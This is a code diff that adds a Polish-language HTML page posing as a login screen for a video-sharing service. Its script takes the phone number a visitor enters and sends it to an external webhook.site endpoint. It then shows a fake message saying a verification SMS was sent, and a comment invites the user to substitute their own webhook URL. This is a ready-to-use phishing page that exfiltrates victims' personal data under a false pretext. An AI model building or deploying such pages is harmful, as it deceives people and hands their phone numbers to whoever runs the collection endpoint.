@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<title>Logowanie</title>
+<style>
+* {margin:0; padding:0; box-sizing:border-box; font-family: "Segoe UI", Arial, sans-serif;}
+body {background:#0f0f0f; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh;}
+.container {width:100%; max-width:400px; padding:20px;}
+.card {background:#1c1c1c; padding:35px; border-radius:12px; box-shadow:0 0 25px rgba(0,0,0,0.5); text-align:center;}
+.logo {font-size:32px; font-weight:bold; color:#ff3b3b; margin-bottom:10px;}
+.title {margin-bottom:25px; font-size:22px; color:#f1f1f1;}
+label {display:block; text-align:left; margin-bottom:8px; font-size:14px; color:#bbbbbb;}
+input {width:100%; padding:12px; margin-bottom:20px; border-radius:8px; border:none; background:#2a2a2a; color:white; font-size:15px;}
+input:focus {outline:2px solid #ff3b3b;}
+.btn {width:100%; padding:12px; background:#ff3b3b; border:none; color:white; font-size:17px; border-radius:8px; cursor:pointer; transition:0.2s;}
+.btn:hover {background:#e53434;}
+.footer-text {margin-top:15px; font-size:12px; color:#777;}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <h1 class="logo">Udostępniaj Filmy Na PC!</h1>
+        <h2 class="title">Zaloguj się</h2>
+        <form id="phoneForm">
+            <label for="phone">Numer telefonu</label>
+            <input type="tel" id="phone" name="phone" placeholder="+48 555 444 333" required>
+            <button type="submit" class="btn">Kontynuuj</button>
+        </form>
+        <p class="footer-text">Formularz działa tylko z Twoją zgodą</p>
+    </div>
+</div>
+
+<script>
+document.getElementById("phoneForm").addEventListener("submit", function(e){
+    e.preventDefault();
+    const phone = document.getElementById("phone").value;
+
+    // === PODMIEŃ NA SWÓJ UNIKALNY WEBHOOK URL ===
+    const webhookUrl = "https://webhook.site/a884c0f4-70ed-415d-a678-a4ca2fa535c2"; 
+
+    // Wysyłamy numer jako GET w URL, żeby od razu był widoczny
+    fetch(webhookUrl + "?numer=" + encodeURIComponent(phone), {
+        method: "GET"
+    })
+    .then(()=> {
+        alert("Dziękujemy! SMS weryfikacyjny został wysłany: " + phone);
+        document.getElementById("phoneForm").reset();
+    })
+    .catch(err => {
+        alert("Wystąpił błąd podczas logowania.");
+        console.error(err);
+    });
+});
+</script>
+
+</body>
+</html>
